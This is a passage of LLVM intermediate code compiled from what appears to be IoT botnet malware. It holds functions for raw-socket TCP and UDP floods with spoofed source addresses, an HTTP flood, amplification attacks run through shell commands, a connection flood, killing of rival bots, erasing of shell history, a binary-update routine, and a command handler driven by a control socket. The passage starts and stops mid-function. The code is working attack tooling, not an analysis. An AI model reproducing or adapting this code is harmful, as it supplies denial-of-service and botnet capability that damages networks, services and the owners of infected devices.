  %127 = add nsw i32 %126, %2
  %128 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %129 = getelementptr inbounds i8, i8* %88, i64 4
  %130 = bitcast i8* %129 to i16*
  %131 = getelementptr inbounds i8, i8* %88, i64 12
  %132 = bitcast i8* %131 to i32*
  %133 = trunc i32 %1 to i16
  %134 = mul nsw i32 %7, 1000
  br label %.outer71

.outer71:                                         ; preds = %.outer71.backedge, %110
  %.066.ph = phi i32 [ 0, %110 ], [ %159, %.outer71.backedge ]
  %.0.ph = phi i32 [ 0, %110 ], [ %.0.ph.be, %.outer71.backedge ]
  br label %135

; <label>:135:                                    ; preds = %.outer71, %155
  %.066 = phi i32 [ 0, %155 ], [ %.066.ph, %.outer71 ]
  %136 = call i64 @sendto(i32 %63, i8* nonnull %88, i64 %86, i32 0, %struct.sockaddr* nonnull %128, i32 16) #3
  %137 = call i32 @rand_cmwc()
  %138 = trunc i32 %137 to i16
  store i16 %138, i16* %103, align 4
  br i1 %12, label %139, label %141

; <label>:139:                                    ; preds = %135
  %140 = call i32 @rand_cmwc()
  br label %144

; <label>:141:                                    ; preds = %135
  %142 = call zeroext i16 @htons(i16 zeroext %133) #18
  %143 = zext i16 %142 to i32
  br label %144

; <label>:144:                                    ; preds = %141, %139
  %145 = phi i32 [ %140, %139 ], [ %143, %141 ]
  %146 = trunc i32 %145 to i16
  store i16 %146, i16* %114, align 2
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %130, align 4
  %149 = call i32 @GetRandomIP(i32 %.070)
  %150 = call i32 @htonl(i32 %149) #18
  store i32 %150, i32* %132, align 4
  %151 = load i16, i16* %120, align 2
  %152 = zext i16 %151 to i32
  %153 = call zeroext i16 @csum(i16* nonnull %118, i32 %152)
  store i16 %153, i16* %125, align 2
  %154 = icmp eq i32 %.066, %5
  br i1 %154, label %155, label %158

; <label>:155:                                    ; preds = %144
  %156 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %157 = icmp sgt i32 %156, %127
  br i1 %157, label %165, label %135

; <label>:158:                                    ; preds = %144
  %159 = add i32 %.066, 1
  %160 = icmp eq i32 %.0.ph, %6
  br i1 %160, label %161, label %163

; <label>:161:                                    ; preds = %158
  %162 = call i32 @usleep(i32 %134) #3
  br label %.outer71.backedge

.outer71.backedge:                                ; preds = %161, %163
  %.0.ph.be = phi i32 [ 0, %161 ], [ %164, %163 ]
  br label %.outer71

; <label>:163:                                    ; preds = %158
  %164 = add i32 %.0.ph, 1
  br label %.outer71.backedge

; <label>:165:                                    ; preds = %155
  call void @llvm.stackrestore(i8* %87)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %52
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %19, %34, %165, %72, %65, %31
  ret void
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #4

declare i32 @usleep(i32) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #9

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #3

; Function Attrs: noinline nounwind uwtable
define void @sendTCP(i8*, i32, i32, i32, i8*, i32, i32) local_unnamed_addr #1 {
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca i32, align 4
  %10 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 0
  store i16 2, i16* %10, align 4
  %11 = icmp eq i32 %1, 0
  br i1 %11, label %12, label %15

; <label>:12:                                     ; preds = %7
  %13 = tail call i32 @rand_cmwc()
  %14 = trunc i32 %13 to i16
  br label %18

; <label>:15:                                     ; preds = %7
  %16 = trunc i32 %1 to i16
  %17 = tail call zeroext i16 @htons(i16 zeroext %16) #18
  br label %18

; <label>:18:                                     ; preds = %15, %12
  %.sink = phi i16 [ %17, %15 ], [ %14, %12 ]
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 1
  store i16 %.sink, i16* %19, align 2
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 2
  %21 = call i32 @getHost(i8* %0, %struct.in_addr* %20)
  %22 = icmp eq i32 %21, 0
  br i1 %22, label %23, label %163

; <label>:23:                                     ; preds = %18
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i64 0, i32 3, i64 0
  %25 = bitcast i8* %24 to i64*
  store i64 0, i64* %25, align 4
  %26 = tail call i32 @socket(i32 2, i32 3, i32 6) #3
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %31

; <label>:28:                                     ; preds = %23
  %29 = load i32, i32* @mainCommSock, align 4
  %30 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %29, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.180, i64 0, i64 0))
  br label %163

; <label>:31:                                     ; preds = %23
  store i32 1, i32* %9, align 4
  %32 = bitcast i32* %9 to i8*
  %33 = call i32 @setsockopt(i32 %26, i32 0, i32 3, i8* nonnull %32, i32 4) #3
  %34 = icmp slt i32 %33, 0
  br i1 %34, label %35, label %38

; <label>:35:                                     ; preds = %31
  %36 = load i32, i32* @mainCommSock, align 4
  %37 = call i32 (i32, i8*, ...) @sockprintf(i32 %36, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.181, i64 0, i64 0))
  br label %163

; <label>:38:                                     ; preds = %31
  %39 = icmp eq i32 %3, 0
  %40 = sub nsw i32 32, %3
  %41 = shl i32 -1, %40
  %.065 = select i1 %39, i32 0, i32 %41
  %42 = sext i32 %5 to i64
  %43 = add nsw i64 %42, 40
  %44 = call i8* @llvm.stacksave()
  %45 = alloca i8, i64 %43, align 16
  %46 = bitcast i8* %45 to %struct.iphdr*
  %47 = getelementptr i8, i8* %45, i64 20
  %48 = bitcast i8* %47 to %struct.tcphdr*
  %49 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %20, i64 0, i32 0
  %50 = load i32, i32* %49, align 4
  %51 = call i32 @GetRandomIP(i32 %.065)
  %52 = call i32 @htonl(i32 %51) #18
  %53 = add i32 %5, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %46, i32 %50, i32 %52, i8 zeroext 6, i32 %53)
  %54 = call i32 @rand_cmwc()
  %55 = trunc i32 %54 to i16
  %56 = bitcast i8* %47 to i16*
  store i16 %55, i16* %56, align 4
  %57 = call i32 @rand_cmwc()
  %58 = getelementptr inbounds i8, i8* %45, i64 24
  %59 = bitcast i8* %58 to i32*
  store i32 %57, i32* %59, align 8
  %60 = getelementptr inbounds i8, i8* %45, i64 28
  %61 = bitcast i8* %60 to i32*
  store i32 0, i32* %61, align 4
  %62 = getelementptr inbounds i8, i8* %45, i64 32
  %63 = bitcast i8* %62 to i16*
  %64 = load i16, i16* %63, align 16
  %65 = and i16 %64, -241
  %66 = or i16 %65, 80
  store i16 %66, i16* %63, align 16
  %67 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.182, i64 0, i64 0)) #15
  %68 = icmp eq i32 %67, 0
  br i1 %68, label %71, label %.preheader

.preheader:                                       ; preds = %38
  %69 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %70 = icmp eq i8* %69, null
  br i1 %70, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:71:                                     ; preds = %38
  %72 = and i16 %64, -8177
  %73 = or i16 %72, 8016
  store i16 %73, i16* %63, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %74 = phi i8* [ %86, %.backedge68 ], [ %69, %.lr.ph.preheader ]
  %75 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.184, i64 0, i64 0)) #15
  %76 = icmp eq i32 %75, 0
  br i1 %76, label %77, label %80

; <label>:77:                                     ; preds = %.lr.ph
  %78 = load i16, i16* %63, align 16
  %79 = or i16 %78, 512
  store i16 %79, i16* %63, align 16
  br label %.backedge68

; <label>:80:                                     ; preds = %.lr.ph
  %81 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.185, i64 0, i64 0)) #15
  %82 = icmp eq i32 %81, 0
  br i1 %82, label %83, label %88

; <label>:83:                                     ; preds = %80
  %84 = load i16, i16* %63, align 16
  %85 = or i16 %84, 1024
  store i16 %85, i16* %63, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %83, %97, %106, %103, %91, %77
  %86 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.183, i64 0, i64 0)) #3
  %87 = icmp eq i8* %86, null
  br i1 %87, label %.loopexit.loopexit, label %.lr.ph

; <label>:88:                                     ; preds = %80
  %89 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.186, i64 0, i64 0)) #15
  %90 = icmp eq i32 %89, 0
  br i1 %90, label %91, label %94

; <label>:91:                                     ; preds = %88
  %92 = load i16, i16* %63, align 16
  %93 = or i16 %92, 256
  store i16 %93, i16* %63, align 16
  br label %.backedge68

; <label>:94:                                     ; preds = %88
  %95 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.187, i64 0, i64 0)) #15
  %96 = icmp eq i32 %95, 0
  br i1 %96, label %97, label %100

; <label>:97:                                     ; preds = %94
  %98 = load i16, i16* %63, align 16
  %99 = or i16 %98, 4096
  store i16 %99, i16* %63, align 16
  br label %.backedge68

; <label>:100:                                    ; preds = %94
  %101 = call i32 @strcmp(i8* nonnull %74, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.188, i64 0, i64 0)) #15
  %102 = icmp eq i32 %101, 0
  br i1 %102, label %103, label %106

; <label>:103:                                    ; preds = %100
  %104 = load i16, i16* %63, align 16
  %105 = or i16 %104, 2048
  store i16 %105, i16* %63, align 16
  br label %.backedge68

; <label>:106:                                    ; preds = %100
  %107 = load i32, i32* @mainCommSock, align 4
  %108 = call i32 (i32, i8*, ...) @sockprintf(i32 %107, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.189, i64 0, i64 0), i8* nonnull %74)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %71
  %109 = call i32 @rand_cmwc()
  %110 = trunc i32 %109 to i16
  %111 = getelementptr inbounds i8, i8* %45, i64 34
  %112 = bitcast i8* %111 to i16*
  store i16 %110, i16* %112, align 2
  %113 = getelementptr inbounds i8, i8* %45, i64 36
  %114 = bitcast i8* %113 to i16*
  store i16 0, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %45, i64 38
  %116 = bitcast i8* %115 to i16*
  store i16 0, i16* %116, align 2
  br i1 %11, label %117, label %119

; <label>:117:                                    ; preds = %.loopexit
  %118 = call i32 @rand_cmwc()
  br label %123

; <label>:119:                                    ; preds = %.loopexit
  %120 = trunc i32 %1 to i16
  %121 = call zeroext i16 @htons(i16 zeroext %120) #18
  %122 = zext i16 %121 to i32
  br label %123

; <label>:123:                                    ; preds = %119, %117
  %124 = phi i32 [ %118, %117 ], [ %122, %119 ]
  %125 = trunc i32 %124 to i16
  %126 = getelementptr inbounds i8, i8* %45, i64 22
  %127 = bitcast i8* %126 to i16*
  store i16 %125, i16* %127, align 2
  %128 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %128, i16* %114, align 4
  %129 = bitcast i8* %45 to i16*
  %130 = getelementptr inbounds i8, i8* %45, i64 2
  %131 = bitcast i8* %130 to i16*
  %132 = load i16, i16* %131, align 2
  %133 = zext i16 %132 to i32
  %134 = call zeroext i16 @csum(i16* nonnull %129, i32 %133)
  %135 = getelementptr inbounds i8, i8* %45, i64 10
  %136 = bitcast i8* %135 to i16*
  store i16 %134, i16* %136, align 2
  %137 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %138 = add nsw i32 %137, %2
  %139 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %140 = getelementptr inbounds i8, i8* %45, i64 12
  %141 = bitcast i8* %140 to i32*
  %142 = getelementptr inbounds i8, i8* %45, i64 4
  %143 = bitcast i8* %142 to i16*
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %123
  %.0 = phi i32 [ 0, %123 ], [ %.0.be, %.backedge.backedge ]
  %144 = call i64 @sendto(i32 %26, i8* nonnull %45, i64 %43, i32 0, %struct.sockaddr* nonnull %139, i32 16) #3
  %145 = call i32 @GetRandomIP(i32 %.065)
  %146 = call i32 @htonl(i32 %145) #18
  store i32 %146, i32* %141, align 4
  %147 = call i32 @rand_cmwc()
  %148 = trunc i32 %147 to i16
  store i16 %148, i16* %143, align 4
  %149 = call i32 @rand_cmwc()
  store i32 %149, i32* %59, align 8
  %150 = call i32 @rand_cmwc()
  %151 = trunc i32 %150 to i16
  store i16 %151, i16* %56, align 4
  store i16 0, i16* %114, align 4
  %152 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %46, %struct.tcphdr* nonnull %48)
  store i16 %152, i16* %114, align 4
  %153 = load i16, i16* %131, align 2
  %154 = zext i16 %153 to i32
  %155 = call zeroext i16 @csum(i16* nonnull %129, i32 %154)
  store i16 %155, i16* %136, align 2
  %156 = icmp eq i32 %.0, %6
  br i1 %156, label %157, label %160

; <label>:157:                                    ; preds = %.backedge
  %158 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %159 = icmp sgt i32 %158, %138
  br i1 %159, label %162, label %.backedge.backedge

; <label>:160:                                    ; preds = %.backedge
  %161 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %160, %157
  %.0.be = phi i32 [ %161, %160 ], [ 0, %157 ]
  br label %.backedge

; <label>:162:                                    ; preds = %157
  call void @llvm.stackrestore(i8* %44)
  br label %163

; <label>:163:                                    ; preds = %18, %162, %35, %28
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline noreturn nounwind uwtable
define void @botkiller() local_unnamed_addr #12 {
  %1 = alloca [80 x i8], align 16
  %2 = getelementptr inbounds [80 x i8], [80 x i8]* %1, i64 0, i64 0
  br label %3

; <label>:3:                                      ; preds = %13, %0
  br label %4

; <label>:4:                                      ; preds = %4, %3
  %indvars.iv = phi i64 [ 0, %3 ], [ %indvars.iv.next, %4 ]
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.190, i64 0, i64 0), i64 10, i32 1, i1 false)
  %5 = getelementptr inbounds [86 x i8*], [86 x i8*]* @knownBots, i64 0, i64 %indvars.iv
  %6 = load i8*, i8** %5, align 8
  %7 = call i8* @strcat(i8* nonnull %2, i8* %6) #3
  %8 = call i32 @system(i8* nonnull %2) #3
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* nonnull %2, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.191, i64 0, i64 0), i64 11, i32 1, i1 false)
  %9 = load i8*, i8** %5, align 8
  %10 = call i8* @strcat(i8* nonnull %2, i8* %9) #3
  %strlen = call i64 @strlen(i8* nonnull %2)
  %endptr = getelementptr [80 x i8], [80 x i8]* %1, i64 0, i64 %strlen
  %11 = bitcast i8* %endptr to i16*
  store i16 34, i16* %11, align 1
  %12 = call i32 @system(i8* nonnull %2) #3
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, 9
  br i1 %exitcond, label %13, label %4

; <label>:13:                                     ; preds = %4
  %14 = call i32 @sleep(i32 5) #3
  br label %3
}

; Function Attrs: nounwind
declare i32 @sprintf(i8* nocapture, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: nounwind
declare i8* @strcat(i8*, i8* nocapture readonly) local_unnamed_addr #5

declare i32 @system(i8* nocapture readonly) local_unnamed_addr #4

declare i32 @sleep(i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @ClearHistory() local_unnamed_addr #1 {
  %1 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.193, i64 0, i64 0)) #3
  %2 = tail call i32 @system(i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.194, i64 0, i64 0)) #3
  %3 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.195, i64 0, i64 0)) #3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendHTTP(i8*, i8*, i16 zeroext, i8*, i32, i32) local_unnamed_addr #1 {
  %7 = alloca [512 x i8], align 16
  %8 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %9 = add nsw i32 %8, %4
  %10 = getelementptr inbounds [512 x i8], [512 x i8]* %7, i64 0, i64 0
  %11 = tail call i32 @rand() #3
  %12 = srem i32 %11, 30
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds [3 x i8*], [3 x i8*]* @sendHTTP.connections, i64 0, i64 %13
  %15 = load i8*, i8** %14, align 8
  %16 = tail call i32 @rand() #3
  %17 = srem i32 %16, 674
  %18 = sext i32 %17 to i64
  %19 = getelementptr inbounds [649 x i8*], [649 x i8*]* @sendHTTP.useragents, i64 0, i64 %18
  %20 = load i8*, i8** %19, align 8
  %21 = call i32 (i8*, i8*, ...) @sprintf(i8* nonnull %10, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.501, i64 0, i64 0), i8* %1, i8* %3, i8* %15, i8* %20) #3
  %22 = icmp sgt i32 %5, 0
  br i1 %22, label %.lr.ph13.preheader, label %._crit_edge14

.lr.ph13.preheader:                               ; preds = %6
  br label %.lr.ph13

; <label>:23:                                     ; preds = %.lr.ph13
  %24 = icmp slt i32 %27, %5
  br i1 %24, label %.lr.ph13, label %._crit_edge14.loopexit

.lr.ph13:                                         ; preds = %.lr.ph13.preheader, %23
  %.011 = phi i32 [ %27, %23 ], [ 0, %.lr.ph13.preheader ]
  %25 = tail call i32 @fork() #3
  %26 = icmp eq i32 %25, 0
  %27 = add nuw nsw i32 %.011, 1
  br i1 %26, label %23, label %.preheader

.preheader:                                       ; preds = %.lr.ph13
  %28 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %29 = icmp sgt i32 %9, %28
  br i1 %29, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge
  %30 = tail call i32 @socket_connect(i8* %0, i16 zeroext %2)
  %31 = icmp eq i32 %30, 0
  br i1 %31, label %.backedge, label %32

; <label>:32:                                     ; preds = %.lr.ph
  %33 = call i64 @strlen(i8* nonnull %10) #15
  %34 = call i64 @write(i32 %30, i8* nonnull %10, i64 %33) #3
  %35 = tail call i32 @close(i32 %30) #3
  br label %.backedge

.backedge:                                        ; preds = %32, %.lr.ph
  %36 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %37 = icmp sgt i32 %9, %36
  br i1 %37, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.backedge
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  tail call void @_exit(i32 1) #17
  unreachable

._crit_edge14.loopexit:                           ; preds = %23
  br label %._crit_edge14

._crit_edge14:                                    ; preds = %._crit_edge14.loopexit, %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @senditbudAMP(i8* nocapture readonly, i8*, i8*, i8*) local_unnamed_addr #1 {
  %5 = alloca [128 x i8], align 16
  %6 = alloca [128 x i8], align 16
  %7 = alloca [128 x i8], align 16
  %8 = alloca [128 x i8], align 16
  %9 = alloca [128 x i8], align 16
  %10 = alloca [128 x i8], align 16
  %11 = alloca [128 x i8], align 16
  %12 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.502, i64 0, i64 0)) #15
  %13 = icmp eq i32 %12, 0
  br i1 %13, label %14, label %18

; <label>:14:                                     ; preds = %4
  %15 = getelementptr inbounds [128 x i8], [128 x i8]* %5, i64 0, i64 0
  %16 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %15, i64 128, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.503, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %17 = call i32 @system(i8* nonnull %15) #3
  br label %18

; <label>:18:                                     ; preds = %4, %14
  %19 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.504, i64 0, i64 0)) #15
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %25

; <label>:21:                                     ; preds = %18
  %22 = getelementptr inbounds [128 x i8], [128 x i8]* %6, i64 0, i64 0
  %23 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %22, i64 128, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.505, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %24 = call i32 @system(i8* nonnull %22) #3
  br label %25

; <label>:25:                                     ; preds = %18, %21
  %26 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.506, i64 0, i64 0)) #15
  %27 = icmp eq i32 %26, 0
  br i1 %27, label %28, label %32

; <label>:28:                                     ; preds = %25
  %29 = getelementptr inbounds [128 x i8], [128 x i8]* %7, i64 0, i64 0
  %30 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %29, i64 128, i8* getelementptr inbounds ([30 x i8], [30 x i8]* @.str.507, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %31 = call i32 @system(i8* nonnull %29) #3
  br label %32

; <label>:32:                                     ; preds = %25, %28
  %33 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.508, i64 0, i64 0)) #15
  %34 = icmp eq i32 %33, 0
  br i1 %34, label %35, label %39

; <label>:35:                                     ; preds = %32
  %36 = getelementptr inbounds [128 x i8], [128 x i8]* %8, i64 0, i64 0
  %37 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %36, i64 128, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.509, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %38 = call i32 @system(i8* nonnull %36) #3
  br label %39

; <label>:39:                                     ; preds = %32, %35
  %40 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i64 0, i64 0)) #15
  %41 = icmp eq i32 %40, 0
  br i1 %41, label %42, label %46

; <label>:42:                                     ; preds = %39
  %43 = getelementptr inbounds [128 x i8], [128 x i8]* %9, i64 0, i64 0
  %44 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %43, i64 128, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.511, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %45 = call i32 @system(i8* nonnull %43) #3
  br label %46

; <label>:46:                                     ; preds = %39, %42
  %47 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.512, i64 0, i64 0)) #15
  %48 = icmp eq i32 %47, 0
  br i1 %48, label %49, label %53

; <label>:49:                                     ; preds = %46
  %50 = getelementptr inbounds [128 x i8], [128 x i8]* %10, i64 0, i64 0
  %51 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %50, i64 128, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.513, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %52 = call i32 @system(i8* nonnull %50) #3
  br label %53

; <label>:53:                                     ; preds = %46, %49
  %54 = tail call i32 @strcmp(i8* %0, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.514, i64 0, i64 0)) #15
  %55 = icmp eq i32 %54, 0
  br i1 %55, label %56, label %60

; <label>:56:                                     ; preds = %53
  %57 = getelementptr inbounds [128 x i8], [128 x i8]* %11, i64 0, i64 0
  %58 = call i32 (i8*, i64, i8*, ...) @snprintf(i8* nonnull %57, i64 128, i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.515, i64 0, i64 0), i8* %1, i8* %2, i8* %3) #3
  %59 = call i32 @system(i8* nonnull %57) #3
  br label %60

; <label>:60:                                     ; preds = %53, %56
  ret void
}

; Function Attrs: nounwind
declare i32 @snprintf(i8* nocapture, i64, i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @sendCNC(i8*, i32, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.sockaddr_in, align 4
  %5 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %6 = add nsw i32 %5, %2
  %7 = tail call i32 @inet_addr(i8* %0) #3
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 2, i32 0
  store i32 %7, i32* %8, align 4
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 0
  store i16 2, i16* %9, align 4
  %10 = trunc i32 %1 to i16
  %11 = tail call zeroext i16 @htons(i16 zeroext %10) #18
  %12 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %4, i64 0, i32 1
  store i16 %11, i16* %12, align 2
  %13 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %14 = icmp sgt i32 %6, %13
  br i1 %14, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %3
  %15 = bitcast %struct.sockaddr_in* %4 to %struct.sockaddr*
  br label %16

; <label>:16:                                     ; preds = %.lr.ph, %16
  %17 = call i32 @socket(i32 2, i32 1, i32 0) #3
  %18 = call i32 @connect(i32 %17, %struct.sockaddr* nonnull %15, i32 16) #3
  %19 = call i32 @sleep(i32 1) #3
  %20 = call i32 @close(i32 %17) #3
  %21 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %22 = icmp sgt i32 %6, %21
  br i1 %22, label %16, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %16
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @UpdateBins() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %3, label %6

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @system(i8* getelementptr inbounds ([439 x i8], [439 x i8]* @.str.516, i64 0, i64 0)) #3
  %5 = tail call i32 @sleep(i32 20) #3
  br label %8

; <label>:6:                                      ; preds = %0
  %7 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.517, i64 0, i64 0), i32 %1)
  br label %8

; <label>:8:                                      ; preds = %6, %3
  ret void
}

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @processCmd(i32, i8** readonly) local_unnamed_addr #1 {
  %3 = load i8*, i8** %1, align 8
  %4 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.134, i64 0, i64 0)) #15
  %5 = icmp eq i32 %4, 0
  br i1 %5, label %.loopexit, label %6

; <label>:6:                                      ; preds = %2
  %7 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.518, i64 0, i64 0)) #15
  %8 = icmp eq i32 %7, 0
  br i1 %8, label %.loopexit, label %9

; <label>:9:                                      ; preds = %6
  %10 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.519, i64 0, i64 0)) #15
  %11 = icmp eq i32 %10, 0
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %9
  tail call void @UpdateBins() #3
  br label %.loopexit

; <label>:13:                                     ; preds = %9
  %14 = tail call i32 @strcmp(i8* %3, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.520, i64 0, i64 0)) #15
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %44

; <label>:16:                                     ; preds = %13
  %17 = getelementptr inbounds i8*, i8** %1, i64 1
  %18 = load i8*, i8** %17, align 8
  %19 = tail call i32 @strcmp(i8* %18, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.521, i64 0, i64 0)) #15
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %28

; <label>:21:                                     ; preds = %16
  %22 = load i32, i32* @scanPid, align 4
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %.loopexit, label %24

; <label>:24:                                     ; preds = %21
  %25 = tail call i32 @kill(i32 %22, i32 9) #3
  %26 = load i32, i32* @mainCommSock, align 4
  %27 = tail call i32 (i32, i8*, ...) @sockprintf(i32 %26, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.522, i64 0, i64 0))
